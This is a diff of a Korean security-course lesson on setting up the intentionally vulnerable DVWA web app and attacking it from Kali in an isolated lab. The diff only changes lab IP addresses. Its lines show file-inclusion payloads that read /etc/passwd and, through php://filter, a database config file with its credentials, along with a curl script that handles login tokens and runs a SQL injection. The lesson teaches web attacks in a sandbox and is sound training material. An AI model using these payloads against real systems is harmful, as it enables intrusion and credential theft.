@@ -19,8 +19,8 @@ description: 일부러 취약하게 만든 웹 앱 DVWA를 Ubuntu에 설치하�
 
 | 구분 | 운영체제 | IP 주소 | 역할 |
 |------|----------|---------|------|
-| 공격자 PC | Kali Linux | 192.168.0.10 | 브라우저·curl로 웹 공격 시도 |
-| 서버 | Ubuntu | 192.168.0.30 | DVWA(취약 웹 앱) 호스팅 |
+| 공격자 PC | Kali Linux | 192.168.61.10 | 브라우저·curl로 웹 공격 시도 |
+| 서버 | Ubuntu | 192.168.61.30 | DVWA(취약 웹 앱) 호스팅 |
 
 7주차까지 우리는 **포트 단위 방화벽** 으로 외부에서 안 봐도 될 포트를 막아 왔습니다. 그런데 80번(HTTP)은 웹 서비스를 위해 열어 둬야 합니다. **그럼 80번 안으로 들어오는 공격은 누가 막을까요?**
 
@@ -87,7 +87,7 @@ DVWA는 **일부러 취약하게 만든 웹 앱**입니다. 인터넷에 노출�
 |--------------|------|
 | ✅ 가상머신·내부 네트워크에서만 사용 | VirtualBox/VMware 호스트 전용 네트워크 |
 | ✅ 실습 끝나면 끄거나 삭제 | `sudo systemctl stop apache2` 또는 VM 스냅샷 복원 |
-| ✅ Kali ↔ Ubuntu 둘 다 같은 사설망 | 192.168.0.0/24 같은 내부 대역 |
+| ✅ Kali ↔ Ubuntu 둘 다 같은 사설망 | 192.168.61.0/24 같은 내부 대역 |
 
 ---
 
@@ -117,7 +117,7 @@ systemctl is-active apache2 mariadb
 
 ```bash
 # Apache가 이미 설치돼 있고 active 인 경우에만 Kali에서 현재 상태 확인
-curl -I http://192.168.0.30/
+curl -I http://192.168.61.30/
 # HTTP/1.1 200 OK 가 나와야 정상
 # (80번이 UFW에서 허용된 채로 Apache 기본 페이지 반환)
 ```
@@ -386,7 +386,7 @@ sudo nano config.inc.php
 
 ```bash
 # Kali에서 브라우저(Firefox) 실행 후 다음 주소 접속
-http://192.168.0.30/dvwa/setup.php
+http://192.168.61.30/dvwa/setup.php
 ```
 
 페이지 하단에 시스템 점검 체크리스트가 보입니다. 빨간색이 없는지 확인:
@@ -430,7 +430,7 @@ mariadb -u dvwa -pp@ssw0rd -D dvwa -e "SELECT user FROM users;"
 
 | 항목 | 값 |
 |------|---|
-| 로그인 페이지 | `http://192.168.0.30/dvwa/login.php` |
+| 로그인 페이지 | `http://192.168.61.30/dvwa/login.php` |
 | 기본 ID | `admin` |
 | 기본 비밀번호 | `password` |
 
@@ -444,7 +444,7 @@ curl -I http://localhost/dvwa/login.php
 # HTTP/1.1 200 OK 가 나오면 Apache + PHP + DVWA 연결 정상
 
 # Kali에서는 서버 IP로 확인
-curl -I http://192.168.0.30/dvwa/login.php
+curl -I http://192.168.61.30/dvwa/login.php
 # HTTP/1.1 200 OK 가 나오면 Kali에서 DVWA까지 네트워크 접근 정상
 ```
 
@@ -637,7 +637,7 @@ www-data
 DVWA의 File Inclusion 모듈은 URL 파라미터 `page=` 로 어떤 파일을 보여줄지 결정합니다. 정상 사용:
 
 ```
-http://192.168.0.30/dvwa/vulnerabilities/fi/?page=file1.php
+http://192.168.61.30/dvwa/vulnerabilities/fi/?page=file1.php
 ```
 
 이 코드는 대략 다음과 같이 짜여 있습니다:
@@ -651,13 +651,13 @@ include( $_GET[ 'page' ] );
 **시도 1 — 절대 경로 (가장 확실, PHP `include()`는 절대 경로도 허용):**
 
 ```
-http://192.168.0.30/dvwa/vulnerabilities/fi/?page=/etc/passwd
+http://192.168.61.30/dvwa/vulnerabilities/fi/?page=/etc/passwd
 ```
 
 **시도 2 — 상대 경로 (고전적 Directory Traversal 형태):**
 
 ```
-http://192.168.0.30/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd
+http://192.168.61.30/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd
 ```
 
 > **`../` 가 몇 개 필요한가?**
@@ -690,13 +690,13 @@ ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
 **더 위험한 시도 — DB 설정 파일 읽기:**
 
 ```
-http://192.168.0.30/dvwa/vulnerabilities/fi/?page=/var/www/html/dvwa/config/config.inc.php
+http://192.168.61.30/dvwa/vulnerabilities/fi/?page=/var/www/html/dvwa/config/config.inc.php
 ```
 
 PHP `include()` 는 .php 파일을 만나면 **PHP로 실행**해 버려서 화면에 빈 결과가 나올 수 있습니다. 그래서 진짜 공격에서는 PHP 필터(`php://filter/convert.base64-encode/...`)를 써서 소스 자체를 인코딩된 형태로 받아냅니다. 결과를 디코딩하면 우리가 `dvwa / p@ssw0rd` 로 설정한 DB 자격증명이 그대로 노출됩니다.
 
 ```
-http://192.168.0.30/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=/var/www/html/dvwa/config/config.inc.php
+http://192.168.61.30/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=/var/www/html/dvwa/config/config.inc.php
 ```
 
 → 페이지에 Base64 문자열이 출력 → `echo "받은문자열" | base64 -d` 로 디코딩하면 PHP 소스가 그대로 보입니다.
@@ -711,7 +711,7 @@ http://192.168.0.30/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-en
 ```bash
 # Kali에서 실행
 # 1) 먼저 로그인 페이지를 받아서 세션 쿠키와 CSRF 토큰 동시에 추출
-curl -c /tmp/cookie.txt -s "http://192.168.0.30/dvwa/login.php" -o /tmp/login.html
+curl -c /tmp/cookie.txt -s "http://192.168.61.30/dvwa/login.php" -o /tmp/login.html
 
 # 2) 로그인 CSRF 토큰 추출
 TOKEN=$(grep -oP "name=['\"]user_token['\"][^>]*value=['\"]\K[^'\"]+" /tmp/login.html | head -1)
@@ -725,13 +725,13 @@ curl -b /tmp/cookie.txt -c /tmp/cookie.txt \
      --data-urlencode "password=password" \
      --data-urlencode "user_token=$TOKEN" \
      --data-urlencode "Login=Login" \
-     -s "http://192.168.0.30/dvwa/login.php" -o /dev/null
+     -s "http://192.168.61.30/dvwa/login.php" -o /dev/null
 # --data-urlencode : 폼 값을 안전하게 URL 인코딩해서 전송
 
 # 4) 보안 레벨을 Low로 변경
 # security.php도 CSRF 토큰이 필요하므로 먼저 페이지를 받아 토큰 추출
 curl -b /tmp/cookie.txt -c /tmp/cookie.txt -s \
-     "http://192.168.0.30/dvwa/security.php" -o /tmp/security.html
+     "http://192.168.61.30/dvwa/security.php" -o /tmp/security.html
 
 SEC_TOKEN=$(grep -oP "name=['\"]user_token['\"][^>]*value=['\"]\K[^'\"]+" /tmp/security.html | head -1)
 echo "SEC_TOKEN: $SEC_TOKEN"
@@ -740,12 +740,12 @@ curl -b /tmp/cookie.txt -c /tmp/cookie.txt \
      --data-urlencode "security=low" \
      --data-urlencode "seclev_submit=Submit" \
      --data-urlencode "user_token=$SEC_TOKEN" \
-     -s "http://192.168.0.30/dvwa/security.php" \
+     -s "http://192.168.61.30/dvwa/security.php" \
      -o /dev/null
 
 # 5) SQL Injection 자동 실행
 curl -b /tmp/cookie.txt -s \
-     "http://192.168.0.30/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit" \
+     "http://192.168.61.30/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit" \
      | grep -E "First name|Surname"
 # %27 : URL 인코딩된 작은따옴표
 # %3D : URL 인코딩된 등호
